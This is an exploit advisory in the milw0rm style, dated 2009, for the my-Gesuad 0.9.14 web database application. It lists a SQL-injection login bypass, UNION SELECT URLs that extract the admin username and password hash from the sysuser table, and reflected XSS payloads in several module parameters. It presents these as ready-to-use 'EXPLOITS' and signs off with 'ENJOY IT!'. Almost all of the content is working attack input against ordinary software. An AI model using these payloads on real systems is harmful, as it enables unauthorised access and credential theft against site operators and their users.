@@ -1,0 +1,180 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	        MULTIPLE REMOTE VULNERABILITIES	  	          	     |
+|--------------------------------------------------------------------------------------------|
+|                         	|        my-Gesuad 0.9.14      |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://www.collector.ch/drupal5/index.php    		     			     |
+|-->DOWNLOAD: http://www.collector.ch/drupal5/?q=node/11          	                     |
+|-->DEMO: http://www.collector.ch/drupal5/?q=node/10					     |
+|-->CATEGORY: Management								     |
+|-->DESCRIPTION: Database application to manage applications...       			     |
+|		 									     |
+|-->RELEASED: 2009-03-24								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: N/A									             |
+|-->CATEGORY: AUTH BYPASS/ SQL INJECTION / XSS					             |
+|-->AFFECT VERSION: 0.9.14 (maybe <= ?)				 		     	     |
+|-->Discovered Bug date: 2009-05-06							     |
+|-->Reported Bug date: 2009-05-06							     |
+|-->Fixed bug date: 2009-05-07								     |
+|-->Info patch: http://www.collector.ch/drupal5/?q=forum/15			             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#################
+/////////////////
+
+INTRODUCTION:
+
+/////////////////
+#################
+
+
+This app is similar to mycolex v1.4.2, then similar vulnerabilities xD
+
+
+#########################
+////////////////////////
+
+AUTH BYPASS (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++--------->>>>
+
+
+----------
+EXPLOIT:
+----------
+
+Name=' or 1=1#
+
+password=123456 (over six characters)
+
+Then, going to http://[HOST]/[HOME_PATH]/modules/admuser.php?Modus=Find
+
+We got admin credentials...
+
+Password is encrypted with MySQLSHA-1.
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: Be a register user +++++++++++++++++--------->>>>
+
+<<<<---------++++++++++++++ Condition: magic quotes = ON/OFF +++++++++++++++++--------->>>>
+
+
+------------------
+PROOF OF CONCEPT:
+------------------
+
+
+Some examples:
+
+http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Detail&ID=1+and+0+union+all+select+1,version(),database()+sysuser%23
+
+http://[HOST]/[HOME_PATH]/modules/budget.php?Modus=Detail&ID=5+AND+0+UNION+ALL+SELECT+1,database(),user(),4,5,6,7,8/*
+
+http://[HOST]/[HOME_PATH]/modules/zahlung.php?Modus=Detail&ID=1+AND+0+UNION+ALL+SELECT+1,version()/*&Kontext=adresse
+
+http://[HOST]/[HOME_PATH]/modules/adresse.php?Modus=Detail&ID=2+AND+0+UNION+ALL+SELECT+1,version(),database()%23&Kontext=ereignis
+
+There are more...
+
+Return: user, version, ...
+
+
+----------
+EXPLOITS:
+----------
+
+
+http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Detail&ID=1+and+0+union+all+select+1,SuUser,SuPwd+FROM+sysuser+WHERE+SuID=1%23
+
+http://[HOST]/[HOME_PATH]/modules/budget.php?Modus=Detail&ID=5+AND+0+UNION+ALL+SELECT+1,SuUser,SuPwd,4,5,6,7,8+FROM+sysuser+WHERE+SuID=1/*
+
+Return: username/password (id=1)
+
+
+###########################
+///////////////////////////
+
+CROSS SITE SCRIPTING (XSS):
+
+///////////////////////////
+###########################
+
+
+XSS is possible where you like :P
+
+Some examples:
+
+
+http://[HOST]/[HOME_PATH]/modules/ereignis.php?Modus=List&Page=1"><script>alert('y3nh4ck3r+was+here!')</script>&Order=ErAnfangsdatum
+
+http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Search&Kontext=objekt"><script>alert('y3nh4ck3r+was+here!')</script>
+
+http://[HOST]/[HOME_PATH]/modules/image.php?image=<script>alert('y3nh4ck3r+was+here!')</script>
+
+http://[HOST]/[HOME_PATH]/modules/sitzung.php?Modus=Detail&ID=1"<script>alert('y3nh4ck3r+was+here!')</script>
+
+
+Of course there are more...
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-15]
